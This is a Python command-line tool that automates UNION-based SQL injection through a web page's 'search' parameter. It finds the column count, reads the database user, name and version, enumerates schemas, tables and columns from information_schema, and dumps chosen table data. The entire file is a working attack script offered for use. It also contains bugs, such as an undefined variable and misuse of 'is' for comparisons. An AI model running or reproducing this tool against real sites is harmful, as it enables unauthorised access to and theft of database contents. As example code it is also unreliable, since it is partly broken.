#! /usr/bin env python3
# -*- coding: utf-8 -*-

'injection'

import requests
import re
import argparse

def printJB():
    print(
    '''
    __   __   ___ ______  _   _ 
    \ \ / /  |_  || ___ \| \ | |
     \ V /     | || |_/ /|  \| |
     /   \     | || ___ \| . ` |
    / /^\ \/\__/ /| |_/ /| |\  |
    \/   \/\____/ \____/ \_| \_/

    '''
    )

def getParams():
    parser = argparse.ArgumentParser(description='XJBN')

    # url
    parser.add_argument('-u', '--url', type=str, help='input your url')
    # database
    parser.add_argument('-d', '--database', type=str, default=None,help='input your database')
    # table
    parser.add_argument('-t', '--table', type=str, default=None,help='input your table')
    # columns (return list)
    parser.add_argument('-c', '--columns', type=str, default=None,nargs='+', help='input your columns')

    args = parser.parse_args()

    return args.url,args.database,args.table,args.columns


def controller(url,database,table,columns):
    if url is not None:
        fieldNum = getMess(url)
        if fieldNum is 0:
            dataPrint("fail")
        else:
            dataPrint(fieldNum)
            dbList = getDb(fieldNum)
            dataPrint(dbList)
    else:
        dataPrint("null")
        return

    if database is not None:
        tableList = getTable(fieldNum,db)
        if tableList is 0:
            dataPrint("fail")
        else:
            dataPrint(tableList)
    else:
        dataPrint("null")
        return

    if table is not None:
        columnsList = getColumn(fieldNum,db,table)
        if columnsList is 0:
            dataPrint("fail")
        else:
            dataPrint(columnsList)
    else:
        dataPrint("null")
        return

    if columns is not None:
        dataList = getData(fieldNum, db, table, columns)
        if dataList is 0:
            dataPrint("fail")
        else:
            dataPrint(dataList)
    else:
        dataPrint("null")
        return


# more fish but i like
def dataPrint(data):
    if data is "fail":
        print("fail")
    elif data is "null":
        print("----------------stop----------------")
    else:
        print(data)


def messSplit(data):
    match = {'database': '', 'user': '', 'version': ''}

    temp = re.search('\$~(\w*|\w*@)~\$', data)
    if temp is not None:
        str = temp.group()
        match['database'] = str.replace('$~','').replace('~$','')


    temp = re.search('\*~(\w*|\w*@)~\*', data)
    if temp is not None:
        str = temp.group()
        match['user'] = str.replace('*~','').replace('~*','')

    temp = re.search('\%~(\w*|\w*@)~\%', data)
    if temp is not None:
        str = temp.group()
        match['version'] = str.replace('%~','').replace('~%','')

    return match


def getMess(url):
    fieldLen = "concat('*~',user(),'~*','$~',database(),'~$','%~',version(),'~%')"
    getMessCharPayload = "%' union select " + fieldLen + " # "
    getMessCharParams = {'search': getMessCharPayload}
    for i in range(1, 10):
        res = requests.get(url, params=getMessCharParams)
        data = res.content.decode('utf-8')
        match = messSplit(data)

        if (match['database'] is not '' or match['user'] is not '' or match['version'] is not ''):
            print(match)
            return i+1
        else:
            fieldLen = fieldLen + ',' + fieldLen
            getMessCharPayload = "%' union select " + fieldLen + " # "
            getMessCharParams = {'search': getMessCharPayload}

    return 0

def getDb(fieldNum):
    getDbCharPayload = "%' union select "
    for i in range(1, fieldNum):
        getDbCharPayload += "concat('$~',schema_name,'~$')" + ","
        if i is (fieldNum - 1):
            getDbCharPayload += "concat('$~',schema_name,'~$')"

    getDbCharPayload += " from information_schema.schemata #"

    # print(getTableCharPayload)
    getTableCharParams = {'search': getDbCharPayload}
    res = requests.get(url, params=getTableCharParams)
    data = res.content.decode('utf-8')
    match = re.findall("[^'\$~']\$~(.+?)~\$", data)
    match = list(set(match))
    if (match != None):
        return match

    return 0


def getTable(fieldNum,db):
    getTableCharPayload = "%' union select "
    for i in range(1, fieldNum):
        getTableCharPayload += "concat('$~',table_name,'~$')" + ","
        if i is (fieldNum - 1):
            getTableCharPayload += "concat('$~',table_name,'~$')"

    getTableCharPayload += " from information_schema.tables where table_schema = '" + db + "' #"

    # print(getTableCharPayload)
    getTableCharParams = {'search': getTableCharPayload}
    res = requests.get(url, params=getTableCharParams)
    data = res.content.decode('utf-8')
    match = re.findall("[^'\$~']\$~(.+?)~\$", data)
    match = list(set(match))
    if (match != None):
        return match

    return 0


def getColumn(fieldNum,db,table):
    getColumnsCharPayload = "%' union select "
    for i in range(1, fieldNum):
        getColumnsCharPayload += "concat('$~',column_name,'~$')" + ","
        if i is (fieldNum - 1):
            getColumnsCharPayload += "concat('$~',column_name,'~$')"

    getColumnsCharPayload += " from information_schema.columns where table_name = '" + table + "' and table_schema = '"+ db + "' #"
    # print(getColumnsCharPayload)
    getColumnsCharParams = {'search': getColumnsCharPayload}
    res = requests.get(url, params=getColumnsCharParams)
    data = res.content.decode('utf-8')
    match = re.findall("[^'\$~']\$~(.+?)~\$", data)
    match = list(set(match))
    if (match != None):
        return match

    return 0


def getData(fieldNum,db,table,columns):
    getDataCharPayload = "%' union select "
    columnSit = ''
    for i in range(len(columns)):
        if i is not len(columns) - 1:
            columnSit += columns[i] + ",'|',"
        else:
            columnSit += columns[i]

    getDataPart = "concat('$~'," + columnSit + ",'~$')"
    for i in range(fieldNum):
        if i is not (fieldNum - 1):
            getDataCharPayload += getDataPart + ","
        else:
            getDataCharPayload += getDataPart

    getDataCharPayload += " from " + db + "." + table + " #"
    # print(getDataCharPayload)
    getDataCharParams = {'search': getDataCharPayload}
    res = requests.get(url, params=getDataCharParams)
    data = res.content.decode('utf-8')
    match = re.findall("[^'\$~']\$~(.+?)~\$", data)
    match = list(set(match))
    if (match != None):
        return match

    return 0


def main(url,database,table,columns):
    controller(url,database,table,columns)


if __name__ == "__main__":
    printJB()
    url,db,table,columns = getParams()
    main(url,db,table,columns)